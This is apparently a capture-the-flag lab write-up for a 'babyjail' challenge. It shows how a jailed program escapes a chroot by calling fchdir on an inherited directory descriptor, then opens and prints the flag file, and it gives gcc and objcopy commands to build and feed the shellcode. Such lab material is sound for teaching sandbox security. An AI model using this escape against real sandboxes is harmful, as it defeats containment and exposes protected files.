This time, you should use the function `fchdir` instead of `linkat`.
From the Linux manual page, it is written as follows.

> fchdir() is identical to chdir(); the only difference is that the directory is given as an open file descriptor.

Use the following code to solve this problem.
```
fchdir(3);  # Change working directory into the top-level directory.
open("./flag", O_RDONLY);
sendfile(1, 4, 0, 0x80);
```

Running the following commands will lead you to the flag.
```
gcc -nostdlib -static shellcode.s -o shellcode-elf​
objcopy --dump-section .text=shellcode-raw shellcode-elf​
/babyjail_level6_teaching1 / < ~/shellcode-raw
```